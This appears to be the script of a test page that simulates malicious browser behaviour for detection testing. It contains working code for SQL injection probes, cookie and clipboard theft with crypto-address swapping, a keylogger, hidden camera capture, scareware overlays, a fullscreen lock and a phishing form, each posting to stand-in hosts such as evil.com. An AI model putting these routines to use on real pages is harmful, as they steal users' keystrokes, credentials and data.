// Logging function to display activity
function logActivity(message) {
  const logOutput = document.getElementById("logOutput");
  const timestamp = new Date().toLocaleTimeString();
  const logEntry = document.createElement("div");
  logEntry.innerHTML = `<strong>[${timestamp}]</strong> ${message}`;
  logOutput.appendChild(logEntry);
  logOutput.scrollTop = logOutput.scrollHeight;
}

function clearLogs() {
  document.getElementById("logOutput").innerHTML = "";
}

// 1. SQL Injection-like request
function triggerSQLi() {
  logActivity("🚨 Triggering SQLi-like request...");

  // Multiple suspicious SQL injection patterns
  const sqlPatterns = [
    "/api/user?id=' OR 1=1 --",
    "/api/login?username=admin'--&password=anything",
    "/search?q=' UNION SELECT * FROM users --",
    "/api/data?filter=' DROP TABLE users; --",
  ];

  sqlPatterns.forEach((pattern, index) => {
    setTimeout(() => {
      fetch(pattern)
        .then((r) => logActivity(`SQLi request sent: ${pattern}`))
        .catch((e) =>
          logActivity(`SQLi request failed (expected): ${pattern}`)
        );
    }, index * 100);
  });
}

// 2. Weird redirect
function triggerRedirect() {
  logActivity("🚨 Triggering suspicious redirect...");

  // Show warning before redirect
  if (confirm("This will redirect to a test URL. Continue?")) {
    logActivity("Redirecting to suspicious URL...");
    setTimeout(() => {
      window.location.href =
        "https://example.com/?weird=1&suspicious=true&redirect=malicious";
    }, 1000);
  } else {
    logActivity("Redirect cancelled by user");
  }
}

// 4. Too many requests (spam)
function triggerSpamRequests() {
  logActivity("🚨 Triggering spam requests...");

  const requestCount = 25;
  const endpoints = ["/ping", "/api/status", "/health", "/check"];

  for (let i = 0; i < requestCount; i++) {
    setTimeout(() => {
      const endpoint = endpoints[i % endpoints.length];
      const url = `${endpoint}?count=${i}&spam=true&timestamp=${Date.now()}`;

      fetch(url)
        .then((r) =>
          logActivity(`Spam request ${i + 1}/${requestCount}: ${url}`)
        )
        .catch((e) =>
          logActivity(`Spam request ${i + 1} failed (expected): ${url}`)
        );
    }, i * 50); // Rapid fire requests
  }
}

// 5. Fake malware download
function triggerMalwareDownload() {
  logActivity("🚨 Triggering fake malware download...");

  // Create multiple suspicious files
  const suspiciousFiles = [
    {
      name: "test-malware.txt",
      content: "This is a harmless test file simulating malware",
      type: "text/plain",
    },
    {
      name: "suspicious-payload.exe",
      content: "FAKE_EXECUTABLE_CONTENT_FOR_TESTING",
      type: "application/octet-stream",
    },
    {
      name: "virus-test.bat",
      content: "@echo off\necho This is a test batch file\npause",
      type: "text/plain",
    },
    {
      name: "keylogger.js",
      content:
        "// Fake keylogger code for testing\nconsole.log('Simulated malicious script');",
      type: "application/javascript",
    },
  ];

  suspiciousFiles.forEach((file, index) => {
    setTimeout(() => {
      const blob = new Blob([file.content], { type: file.type });
      const url = URL.createObjectURL(blob);

      const a = document.createElement("a");
      a.href = url;
      a.download = file.name;
      a.style.display = "none";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);

      // Clean up URL object
      setTimeout(() => URL.revokeObjectURL(url), 1000);

      logActivity(`Downloaded suspicious file: ${file.name}`);
    }, index * 1000);
  });
}

// Additional suspicious behaviors
function triggerCookieTheft() {
  logActivity("🚨 Simulating cookie theft attempt...");

  // Attempt to access and log cookies
  try {
    const cookies = document.cookie;
    logActivity(`Cookies accessed: ${cookies || "No cookies found"}`);

    // Simulate sending cookies to external server
    fetch("https://evil-server.example.com/steal", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        cookies: cookies,
        userAgent: navigator.userAgent,
        timestamp: Date.now(),
      }),
    }).catch((e) => logActivity("Cookie theft simulation failed (expected)"));
  } catch (error) {
    logActivity(`Cookie access error: ${error.message}`);
  }
}

function triggerLocalStorageAccess() {
  logActivity("🚨 Accessing local storage...");

  try {
    // Store some fake sensitive data
    localStorage.setItem("test-password", "fake-sensitive-data");
    localStorage.setItem("test-token", "fake-auth-token-12345");

    // Access all localStorage items
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const value = localStorage.getItem(key);
      logActivity(`LocalStorage accessed: ${key} = ${value}`);
    }
  } catch (error) {
    logActivity(`LocalStorage access error: ${error.message}`);
  }
}

// 6. Clipboard Data Stealing
function stealClipboardData() {
  logActivity("🚨 Attempting to steal clipboard data...");

  // Read clipboard data
  navigator.clipboard
    .readText()
    .then((clipboardText) => {
      if (clipboardText) {
        logActivity(`✅ Clipboard data stolen: "${clipboardText}"`);
        console.warn("[CLIPBOARD THEFT] Stolen data:", clipboardText);

        // Simulate sending stolen data to malicious server
        fetch("https://evil-server.example.com/steal-clipboard", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            clipboardData: clipboardText,
            timestamp: Date.now(),
            userAgent: navigator.userAgent,
            url: window.location.href,
          }),
        }).catch((e) =>
          logActivity("📤 Attempted to send clipboard data to malicious server")
        );

        // Overwrite clipboard with malicious content (crypto address swapping simulation)
        const maliciousContent = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"; // Fake Bitcoin address
        navigator.clipboard
          .writeText(maliciousContent)
          .then(() => {
            logActivity(
              `🔄 Clipboard overwritten with malicious content: ${maliciousContent}`
            );
            console.warn(
              "[CLIPBOARD MANIPULATION] Clipboard replaced with:",
              maliciousContent
            );
          })
          .catch((e) => {
            logActivity("❌ Failed to overwrite clipboard");
          });
      } else {
        logActivity("⚠️ Clipboard is empty");
      }
    })
    .catch((error) => {
      logActivity(`❌ Failed to read clipboard: ${error.message}`);
      console.error("[CLIPBOARD THEFT] Error:", error);

      // Fallback: Try alternative clipboard access method
      tryLegacyClipboardAccess();
    });
}

// Alternative clipboard access method (older browsers)
function tryLegacyClipboardAccess() {
  logActivity("⚠️ Attempting legacy clipboard access method...");

  try {
    // Create hidden textarea to read clipboard
    const textarea = document.createElement("textarea");
    textarea.style.position = "fixed";
    textarea.style.opacity = "0";
    document.body.appendChild(textarea);
    textarea.focus();
    document.execCommand("paste");

    const clipboardData = textarea.value;
    if (clipboardData) {
      logActivity(`✅ Legacy clipboard access successful: "${clipboardData}"`);
      console.warn("[LEGACY CLIPBOARD THEFT] Stolen data:", clipboardData);
    } else {
      logActivity("⚠️ Legacy clipboard access returned empty");
    }

    document.body.removeChild(textarea);
  } catch (error) {
    logActivity(`❌ Legacy clipboard access failed: ${error.message}`);
  }
}

// 10. Redirect on Load Feature
function enableAutoRedirect() {
  logActivity("🚨 Triggering automatic redirect...");
  console.warn("[AUTO REDIRECT] Immediate redirect triggered by button");

  // Show countdown
  let countdown = 2;
  const countdownInterval = setInterval(() => {
    logActivity(`⏳ Redirecting in ${countdown} seconds...`);
    countdown--;

    if (countdown < 0) {
      clearInterval(countdownInterval);
    }
  }, 1000);

  // Redirect after 2 seconds
  setTimeout(() => {
    logActivity("🔄 Automatic redirect executing now!");
    console.warn("[AUTO REDIRECT] Redirecting to suspicious URL");

    // Perform redirect
    window.location.href =
      "https://example.com/?auto-redirect=true&suspicious=load&timestamp=" +
      Date.now();
  }, 2000);
}

// 11. Fake OS/Security Warning
function showFakeSecurityWarning() {
  logActivity("🚨 Displaying fake security warning...");
  console.warn("[FAKE WARNING] Creating fake OS security alert");

  // Create full-screen overlay
  const overlay = document.createElement("div");
  overlay.id = "fakeSecurityOverlay";
  overlay.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: #0078d4;
    z-index: 999999;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    color: white;
  `;

  // Create warning content
  overlay.innerHTML = `
    <div style="text-align: center; max-width: 600px; padding: 40px;">
      <div style="font-size: 80px; margin-bottom: 20px;">:(</div>
      <h1 style="font-size: 36px; font-weight: 300; margin: 20px 0;">
        Your PC ran into a problem and needs to restart.
      </h1>
      <p style="font-size: 18px; margin: 20px 0;">
        We're just collecting some error info, and then we'll restart for you.
      </p>
      <p style="font-size: 24px; margin: 30px 0;">
        <span id="fakeProgress">0</span>% complete
      </p>
      <div style="margin-top: 40px; font-size: 14px; text-align: left;">
        <p>Stop code: CRITICAL_PROCESS_DIED</p>
        <p>Error: 0x0000007B</p>
      </div>
      <button onclick="closeFakeWarning()" style="
        margin-top: 30px;
        padding: 12px 30px;
        background-color: white;
        color: #0078d4;
        border: none;
        border-radius: 4px;
        font-size: 16px;
        cursor: pointer;
        font-weight: bold;
      ">Close Warning (Test Mode)</button>
    </div>
  `;

  document.body.appendChild(overlay);
  logActivity("⚠️ Fake Windows BSOD displayed");

  // Animate progress
  let progress = 0;
  const progressInterval = setInterval(() => {
    progress += Math.floor(Math.random() * 5) + 1;
    if (progress > 100) progress = 100;

    const progressEl = document.getElementById("fakeProgress");
    if (progressEl) {
      progressEl.textContent = progress;
    }

    if (progress >= 100) {
      clearInterval(progressInterval);
    }
  }, 500);

  // Show additional fake warnings after 3 seconds
  setTimeout(() => {
    showFakeVirusAlert();
  }, 3000);
}

function showFakeVirusAlert() {
  logActivity("🚨 Displaying fake virus alert...");
  console.warn("[FAKE WARNING] Creating fake virus alert");

  const virusAlert = document.createElement("div");
  virusAlert.id = "fakeVirusAlert";
  virusAlert.style.cssText = `
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 500px;
    background: white;
    border: 3px solid red;
    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
    z-index: 1000000;
    font-family: Arial, sans-serif;
    border-radius: 8px;
  `;

  virusAlert.innerHTML = `
    <div style="background: linear-gradient(to bottom, #ff0000, #cc0000); color: white; padding: 15px; border-radius: 5px 5px 0 0;">
      <h2 style="margin: 0; font-size: 20px;">⚠️ Windows Security Alert</h2>
    </div>
    <div style="padding: 25px; color: #333;">
      <p style="font-size: 16px; font-weight: bold; color: red; margin: 0 0 15px 0;">
        ⛔ CRITICAL SECURITY WARNING!
      </p>
      <p style="margin: 10px 0;">
        <strong>System Infected!</strong><br>
        Your computer has been infected with malware.
      </p>
      <p style="margin: 10px 0;">
        <strong>Threats Detected:</strong>
      </p>
      <ul style="margin: 10px 0; padding-left: 20px;">
        <li>Trojan:Win32/Wacatac.B!ml</li>
        <li>Backdoor:Win32/Agent.gen</li>
        <li>Spyware.KeyLogger</li>
      </ul>
      <p style="margin: 15px 0; font-size: 14px;">
        <strong>Error Code:</strong> 0x80070643<br>
        <strong>Support ID:</strong> 1-800-FAKE-NUM
      </p>
      <div style="margin-top: 20px; text-align: center;">
        <button onclick="closeFakeVirusAlert()" style="
          padding: 12px 40px;
          background-color: red;
          color: white;
          border: none;
          border-radius: 4px;
          font-size: 16px;
          cursor: pointer;
          font-weight: bold;
          margin-right: 10px;
        ">⚠️ Call Support Now</button>
        <button onclick="closeFakeVirusAlert()" style="
          padding: 12px 40px;
          background-color: #0078d4;
          color: white;
          border: none;
          border-radius: 4px;
          font-size: 16px;
          cursor: pointer;
          font-weight: bold;
        ">Close (Test)</button>
      </div>
    </div>
  `;

  document.body.appendChild(virusAlert);
  logActivity("⚠️ Fake virus alert displayed");

  // Add beeping sound effect (via Audio API)
  try {
    const audioContext = new (window.AudioContext ||
      window.webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();

    oscillator.connect(gainNode);
    gainNode.connect(audioContext.destination);

    oscillator.frequency.value = 800;
    gainNode.gain.value = 0.3;

    oscillator.start();
    setTimeout(() => oscillator.stop(), 200);

    logActivity("🔊 Alert sound played");
  } catch (e) {
    console.log("Audio not available");
  }
}

function closeFakeWarning() {
  const overlay = document.getElementById("fakeSecurityOverlay");
  if (overlay) {
    overlay.remove();
    logActivity("✅ Fake BSOD closed");
  }
}

function closeFakeVirusAlert() {
  const alert = document.getElementById("fakeVirusAlert");
  if (alert) {
    alert.remove();
    logActivity("✅ Fake virus alert closed");
  }
}

// 12. Fullscreen UI Hijacking
function hijackFullscreen() {
  logActivity("🚨 Attempting fullscreen UI hijacking...");
  console.warn("[FULLSCREEN HIJACK] Forcing fullscreen mode");

  // Request fullscreen
  const elem = document.documentElement;

  if (elem.requestFullscreen) {
    elem
      .requestFullscreen()
      .then(() => {
        logActivity("✅ Fullscreen mode activated");
        startUIHijack();
      })
      .catch((err) => {
        logActivity(`❌ Fullscreen request denied: ${err.message}`);
        console.error("[FULLSCREEN HIJACK] Failed:", err);
      });
  } else if (elem.webkitRequestFullscreen) {
    elem.webkitRequestFullscreen();
    logActivity("✅ Fullscreen mode activated (webkit)");
    startUIHijack();
  } else if (elem.msRequestFullscreen) {
    elem.msRequestFullscreen();
    logActivity("✅ Fullscreen mode activated (ms)");
    startUIHijack();
  } else {
    logActivity("❌ Fullscreen API not supported");
  }
}

function startUIHijack() {
  console.warn("[UI HIJACK] Starting browser UI hijacking");

  // Block ESC key
  document.addEventListener("keydown", blockEscapeKey);
  logActivity("🔒 ESC key blocked");

  // Block back navigation
  window.history.pushState(null, null, window.location.href);
  window.addEventListener("popstate", blockBackButton);
  logActivity("🔒 Back button blocked");

  // Hide browser controls with fake fullscreen UI
  createFakeFullscreenUI();

  // Try to keep fullscreen even if user tries to exit
  document.addEventListener("fullscreenchange", preventFullscreenExit);
  document.addEventListener("webkitfullscreenchange", preventFullscreenExit);
  document.addEventListener("mozfullscreenchange", preventFullscreenExit);

  logActivity("⚠️ UI hijack active - Browser controls hidden");

  // Show escape instructions after 3 seconds
  setTimeout(() => {
    showEscapeInstructions();
  }, 3000);
}

function blockEscapeKey(e) {
  // Hidden exit mechanism: Ctrl+Shift+X
  if (e.ctrlKey && e.shiftKey && e.key === "X") {
    logActivity("🔓 Emergency exit triggered (Ctrl+Shift+X)");
    exitFullscreenHijack();
    return;
  }

  if (e.key === "Escape" || e.keyCode === 27) {
    e.preventDefault();
    e.stopPropagation();
    logActivity("🚫 ESC key press blocked");
    console.warn("[UI HIJACK] ESC key blocked");
    return false;
  }

  // Also block F11 (fullscreen toggle)
  if (e.key === "F11" || e.keyCode === 122) {
    e.preventDefault();
    logActivity("🚫 F11 key press blocked");
    return false;
  }
}
function blockBackButton(e) {
  e.preventDefault();
  window.history.pushState(null, null, window.location.href);
  logActivity("🚫 Back navigation blocked");
  console.warn("[UI HIJACK] Back button blocked");
}

function preventFullscreenExit() {
  if (!document.fullscreenElement && !document.webkitFullscreenElement) {
    logActivity("⚠️ User attempted to exit fullscreen - re-requesting");
    console.warn("[UI HIJACK] Attempting to maintain fullscreen");

    // Try to go back to fullscreen
    setTimeout(() => {
      const elem = document.documentElement;
      if (elem.requestFullscreen) {
        elem.requestFullscreen().catch(() => {
          logActivity("✅ Fullscreen hijack ended");
          cleanupUIHijack();
        });
      }
    }, 100);
  }
}

function createFakeFullscreenUI() {
  const fakeUI = document.createElement("div");
  fakeUI.id = "fakeFullscreenUI";
  fakeUI.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: black;
    z-index: 999998;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
    font-family: Arial, sans-serif;
  `;

  fakeUI.innerHTML = `
    <div style="text-align: center; padding: 40px;">
      <h1 style="font-size: 48px; margin-bottom: 30px;">🔒 Screen Locked</h1>
      <p style="font-size: 24px; margin: 20px 0;">
        Your browser is now in secure mode
      </p>
      <p style="font-size: 18px; margin: 20px 0; color: #ccc;">
        Navigation controls disabled<br>
        ESC key disabled<br>
        Back button disabled
      </p>
      <div style="margin-top: 40px; padding: 20px; background: rgba(255,255,255,0.1); border-radius: 8px;">
        <p style="font-size: 14px; color: yellow;">
          ⚠️ This is a test demonstration of UI hijacking
        </p>
        <button onclick="exitFullscreenHijack()" style="
          margin-top: 20px;
          padding: 15px 40px;
          background-color: #dc3545;
          color: white;
          border: none;
          border-radius: 5px;
          font-size: 18px;
          cursor: pointer;
          font-weight: bold;
        ">Exit Fullscreen (Test Mode)</button>
      </div>
      <p style="font-size: 12px; color: #666; margin-top: 30px;">
        Note: In a real attack, this button wouldn't exist
      </p>
    </div>
  `;

  document.body.appendChild(fakeUI);
  logActivity("🎭 Fake fullscreen UI displayed - browser controls hidden");
}

function showEscapeInstructions() {
  const instructions = document.createElement("div");
  instructions.style.cssText = `
    position: fixed;
    bottom: 20px;
    right: 20px;
    background: rgba(255, 0, 0, 0.9);
    color: white;
    padding: 15px 20px;
    border-radius: 5px;
    z-index: 9999999;
    font-size: 14px;
    font-family: Arial, sans-serif;
    box-shadow: 0 4px 12px rgba(0,0,0,0.5);
  `;

  instructions.innerHTML = `
    <strong>⚠️ UI Hijack Active</strong><br>
    ESC blocked • Back blocked • Controls hidden
  `;

  document.body.appendChild(instructions);

  setTimeout(() => {
    instructions.remove();
  }, 5000);
}

function exitFullscreenHijack() {
  logActivity("✅ Exiting fullscreen hijack...");

  // Exit fullscreen
  if (document.exitFullscreen) {
    document.exitFullscreen();
  } else if (document.webkitExitFullscreen) {
    document.webkitExitFullscreen();
  } else if (document.msExitFullscreen) {
    document.msExitFullscreen();
  }

  cleanupUIHijack();
}

function cleanupUIHijack() {
  // Remove event listeners
  document.removeEventListener("keydown", blockEscapeKey);
  window.removeEventListener("popstate", blockBackButton);
  document.removeEventListener("fullscreenchange", preventFullscreenExit);
  document.removeEventListener("webkitfullscreenchange", preventFullscreenExit);
  document.removeEventListener("mozfullscreenchange", preventFullscreenExit);

  // Remove fake UI
  const fakeUI = document.getElementById("fakeFullscreenUI");
  if (fakeUI) {
    fakeUI.remove();
  }

  logActivity("✅ Fullscreen hijack cleanup complete");
  console.warn("[UI HIJACK] Cleanup completed");
}

// Auto-steal clipboard on page load (invisible attack)
document.addEventListener("DOMContentLoaded", function () {
  logActivity("Test site loaded successfully");
  logActivity("Ready to simulate suspicious web behaviors");

  // Simulate invisible clipboard theft on load (after 2 seconds)
  setTimeout(() => {
    logActivity("🕵️ Background clipboard monitoring started...");
    // Uncomment below to enable automatic stealing on load
    // stealClipboardData();
  }, 2000);
});

// Auto-steal clipboard when page gains focus
window.addEventListener("focus", function () {
  logActivity("👀 Page focused - monitoring clipboard...");
  // Uncomment below to enable automatic stealing on focus
  // setTimeout(stealClipboardData, 500);
});

// 7. Keylogger Implementation
let keyloggerActive = false;
let keystrokeBuffer = [];
let keyloggerInterval = null;

function startKeylogger() {
  if (keyloggerActive) {
    logActivity("⚠️ Keylogger is already running");
    return;
  }

  keyloggerActive = true;
  keystrokeBuffer = [];
  logActivity("🚨 Keylogger started - All keystrokes are being logged");
  console.warn("[KEYLOGGER] Keylogger activated");

  // Global keydown listener
  document.addEventListener("keydown", captureKeydown);

  // Global keypress listener
  document.addEventListener("keypress", captureKeypress);

  // Global keyup listener for special keys
  document.addEventListener("keyup", captureKeyup);

  // Send keystroke data periodically to simulate data exfiltration
  keyloggerInterval = setInterval(() => {
    if (keystrokeBuffer.length > 0) {
      sendKeystrokeData();
    }
  }, 5000); // Every 5 seconds

  logActivity("⌨️ Monitoring all keyboard input...");
}

function stopKeylogger() {
  if (!keyloggerActive) {
    logActivity("⚠️ Keylogger is not running");
    return;
  }

  keyloggerActive = false;
  document.removeEventListener("keydown", captureKeydown);
  document.removeEventListener("keypress", captureKeypress);
  document.removeEventListener("keyup", captureKeyup);

  if (keyloggerInterval) {
    clearInterval(keyloggerInterval);
    keyloggerInterval = null;
  }

  logActivity("✅ Keylogger stopped");
  console.warn("[KEYLOGGER] Keylogger deactivated");

  // Final data send
  if (keystrokeBuffer.length > 0) {
    sendKeystrokeData();
  }

  keystrokeBuffer = [];
}

function captureKeydown(event) {
  const keystrokeData = {
    type: "keydown",
    key: event.key,
    code: event.code,
    keyCode: event.keyCode,
    timestamp: Date.now(),
    shiftKey: event.shiftKey,
    ctrlKey: event.ctrlKey,
    altKey: event.altKey,
    metaKey: event.metaKey,
  };

  keystrokeBuffer.push(keystrokeData);

  // Log sensitive keys
  if (
    event.key === "Enter" ||
    event.key === "Tab" ||
    event.ctrlKey ||
    event.altKey
  ) {
    logActivity(
      `⌨️ Special key captured: ${event.key} (${event.code}) ${
        event.ctrlKey ? "CTRL+" : ""
      }${event.altKey ? "ALT+" : ""}`
    );
  }

  console.log("[KEYLOGGER] Captured keydown:", keystrokeData);
}

function captureKeypress(event) {
  const char = String.fromCharCode(event.which || event.keyCode);
  const keystrokeData = {
    type: "keypress",
    char: char,
    charCode: event.charCode,
    timestamp: Date.now(),
  };

  keystrokeBuffer.push(keystrokeData);

  logActivity(`⌨️ Key pressed: "${char}"`);
  console.log("[KEYLOGGER] Captured keypress:", keystrokeData);
}

function captureKeyup(event) {
  // Capture special keys on keyup
  if (["Backspace", "Delete", "Escape"].includes(event.key)) {
    const keystrokeData = {
      type: "keyup",
      key: event.key,
      code: event.code,
      timestamp: Date.now(),
    };

    keystrokeBuffer.push(keystrokeData);
    logActivity(`⌨️ Special key released: ${event.key}`);
    console.log("[KEYLOGGER] Captured keyup:", keystrokeData);
  }
}

function sendKeystrokeData() {
  const dataToSend = [...keystrokeBuffer];
  const reconstructedText = reconstructKeystrokesAsText(dataToSend);

  logActivity(
    `📤 Sending ${dataToSend.length} keystrokes to malicious server...`
  );
  console.warn("[KEYLOGGER] Exfiltrating data:", {
    keystrokes: dataToSend,
    reconstructedText: reconstructedText,
  });

  // Simulate sending to malicious server
  fetch("https://evil-keylogger.example.com/collect", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      keystrokes: dataToSend,
      reconstructedText: reconstructedText,
      url: window.location.href,
      userAgent: navigator.userAgent,
      timestamp: Date.now(),
      sessionId: generateSessionId(),
    }),
  }).catch((e) => {
    logActivity("⚠️ Failed to send keystroke data (expected)");
  });

  logActivity(`📝 Captured text: "${reconstructedText}"`);

  // Clear buffer after sending
  keystrokeBuffer = [];
}

function reconstructKeystrokesAsText(keystrokes) {
  let text = "";

  keystrokes.forEach((keystroke) => {
    if (keystroke.type === "keypress" && keystroke.char) {
      text += keystroke.char;
    } else if (keystroke.type === "keydown") {
      if (keystroke.key === "Backspace") {
        text = text.slice(0, -1);
      } else if (keystroke.key === "Enter") {
        text += "\n";
      } else if (keystroke.key === "Tab") {
        text += "\t";
      } else if (keystroke.key === " ") {
        text += " ";
      } else if (keystroke.key.length === 1) {
        text += keystroke.key;
      }
    }
  });

  return text;
}

function generateSessionId() {
  return "session_" + Math.random().toString(36).substring(2, 15);
}

// 8. Camera Access Request (Testing purposes only - no data transmission)
let cameraStream = null;

function requestCameraAccess() {
  logActivity("🚨 Requesting camera access...");
  console.warn("[CAMERA ACCESS] Attempting to access camera and microphone");

  // Request both video and audio
  const constraints = {
    video: {
      width: { min: 640, ideal: 1280, max: 1920 },
      height: { min: 480, ideal: 720, max: 1080 },
      facingMode: "user",
    },
    audio: true,
  };

  navigator.mediaDevices
    .getUserMedia(constraints)
    .then((stream) => {
      cameraStream = stream;
      logActivity("✅ Camera access GRANTED - Stream acquired");
      console.warn("[CAMERA ACCESS] Camera stream obtained");

      // Create hidden video element to record
      const video = document.createElement("video");
      video.style.display = "none";
      video.style.position = "fixed";
      video.srcObject = stream;
      video.play();
      document.body.appendChild(video);

      logActivity("📹 Video recording started (hidden)");
      console.warn(
        "[VIDEO RECORDING] Hidden video element created and recording"
      );

      // Show status periodically
      setInterval(() => {
        if (cameraStream && cameraStream.active) {
          logActivity("📹 Camera stream active - recording video...");
        }
      }, 15000);
    })
    .catch((error) => {
      logActivity(`❌ Camera access DENIED: ${error.name}`);
      console.error("[CAMERA ACCESS] Permission denied:", error);

      // Attempt microphone access as fallback
      attemptMicrophoneAccess();
    });
}

function attemptMicrophoneAccess() {
  logActivity("🎤 Attempting microphone-only access...");
  console.warn("[MICROPHONE ACCESS] Fallback - requesting microphone only");

  const audioConstraints = {
    audio: {
      echoCancellation: false,
      noiseSuppression: false,
      autoGainControl: false,
    },
  };

  navigator.mediaDevices
    .getUserMedia(audioConstraints)
    .then((stream) => {
      cameraStream = stream;
      logActivity("✅ Microphone access GRANTED");
      console.warn("[MICROPHONE ACCESS] Microphone stream obtained");

      // Create hidden audio element
      const audio = document.createElement("audio");
      audio.style.display = "none";
      audio.srcObject = stream;
      audio.play();
      document.body.appendChild(audio);

      logActivity("🎙️ Audio recording started (hidden)");
      console.warn(
        "[AUDIO RECORDING] Hidden audio element created and recording"
      );

      // Show status periodically
      setInterval(() => {
        if (cameraStream && cameraStream.active) {
          logActivity("🎙️ Microphone stream active - recording audio...");
        }
      }, 15000);
    })
    .catch((error) => {
      logActivity(`❌ Microphone access DENIED: ${error.name}`);
      console.error("[MICROPHONE ACCESS] Permission denied:", error);
    });
}

function stopCameraAccess() {
  if (cameraStream) {
    cameraStream.getTracks().forEach((track) => track.stop());
    cameraStream = null;
    logActivity("🛑 Camera/microphone stream stopped");
    console.warn("[CAMERA/AUDIO] Streams terminated");
  }
}

// Monitor for any unhandled errors
window.addEventListener("error", function (event) {
  logActivity(`❌ Error detected: ${event.error?.message || event.message}`);
});

// 9. MIME Type vs File Extension Mismatch
function triggerMimeMismatch() {
  logActivity("🚨 Triggering MIME type vs file extension mismatch...");
  console.warn(
    "[MIME MISMATCH] Creating file with mismatched MIME type and extension"
  );

  // Create content that looks like a PDF
  const pdfContent =
    "%PDF-1.4\n%fake PDF content\nThis appears to be a PDF file";

  // Create a Blob with PDF MIME type but .exe extension
  const blob = new Blob([pdfContent], { type: "application/pdf" });

  // Create object URL
  const url = URL.createObjectURL(blob);

  // Create and trigger download with .exe extension (mismatch)
  const a = document.createElement("a");
  a.href = url;
  a.download = "document.exe"; // File extension is .exe but MIME type is PDF
  a.style.display = "none";
  document.body.appendChild(a);

  logActivity(
    "📥 Downloading file - MIME Type: application/pdf, File Extension: .exe"
  );
  console.warn("[MIME MISMATCH] File details:", {
    mimeType: "application/pdf",
    fileExtension: ".exe",
    fileName: "document.exe",
  });

  a.click();
  document.body.removeChild(a);

  // Clean up URL object
  setTimeout(() => URL.revokeObjectURL(url), 1000);

  logActivity("✅ Mismatched file downloaded - MIME: PDF, Extension: EXE");
}

// 13. Form Credential Hijacking
function hijackFormCredentials() {
  logActivity("🎣 Creating malicious login form...");

  // Create fake login form that submits to third-party domain
  const formHTML = `
    <div id="hijackedFormContainer" style="
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.3);
      z-index: 10000;
      width: 300px;
      border: 2px solid #dc3545;
    ">
      <h2 style="text-align: center; color: #333; margin-top: 0;">Login Required</h2>
      <form id="hijackedForm" method="POST" action="https://evil.com/steal-credentials">
        <input type="text" id="hijackUsername" name="username" placeholder="Username" style="
          width: 100%;
          padding: 10px;
          margin: 10px 0;
          border: 1px solid #ddd;
          border-radius: 4px;
          box-sizing: border-box;
        " required>
        <input type="password" id="hijackPassword" name="password" placeholder="Password" style="
          width: 100%;
          padding: 10px;
          margin: 10px 0;
          border: 1px solid #ddd;
          border-radius: 4px;
          box-sizing: border-box;
        " required>
        <button type="submit" style="
          width: 100%;
          padding: 10px;
          margin: 15px 0 10px 0;
          background-color: #007bff;
          color: white;
          border: none;
          border-radius: 4px;
          cursor: pointer;
          font-weight: bold;
        ">Sign In</button>
      </form>
      <button onclick="closeHijackedForm()" style="
        width: 100%;
        padding: 8px;
        background-color: #6c757d;
        color: white;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        font-size: 14px;
      ">Close (Test Mode)</button>
    </div>
  `;

  document.body.insertAdjacentHTML("beforeend", formHTML);
  logActivity(
    "✅ Hijacked form created (submits to: https://evil.com/steal-credentials)"
  );

  // Monitor password field for reading
  const passwordField = document.getElementById("hijackPassword");
  const usernameField = document.getElementById("hijackUsername");

  passwordField.addEventListener("input", () => {
    const password = passwordField.value;
    logActivity(`⚠️ PASSWORD FIELD READ: ${password.length} characters typed`);
    console.warn("[FORM HIJACK] Password being captured: " + password);
  });

  usernameField.addEventListener("input", () => {
    const username = usernameField.value;
    if (username.length > 0) {
      logActivity(`⚠️ USERNAME FIELD READ: ${username}`);
    }
  });

  // Intercept form submission
  const form = document.getElementById("hijackedForm");
  form.addEventListener("submit", (e) => {
    e.preventDefault();
    const username = document.getElementById("hijackUsername").value;
    const password = document.getElementById("hijackPassword").value;
    logActivity(
      `🚨 FORM SUBMITTED TO EVIL.COM with username: ${username} | password: ${password}`
    );
    console.error(
      "[FORM HIJACK] Credentials captured and would be sent to: https://evil.com/steal-credentials"
    );

    // Simulate actual submission to third-party domain
    fetch("https://evil.com/steal-credentials", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: `username=${encodeURIComponent(
        username
      )}&password=${encodeURIComponent(password)}`,
    }).catch(() => {
      // CORS will block this, but the network request will be made and extension will detect it
      logActivity("📤 Credentials sent to evil.com (CORS blocked)");
    });
  });
}

function closeHijackedForm() {
  const container = document.getElementById("hijackedFormContainer");
  if (container) {
    container.remove();
    logActivity("✅ Hijacked form closed");
  }
}

// Monitor for network activity
const originalFetch = window.fetch;
window.fetch = function (...args) {
  const url = args[0];
  if (typeof url === "string" && !url.includes("localhost")) {
    logActivity(`🌐 Network request intercepted: ${url}`);
  }
  return originalFetch.apply(this, args);
};
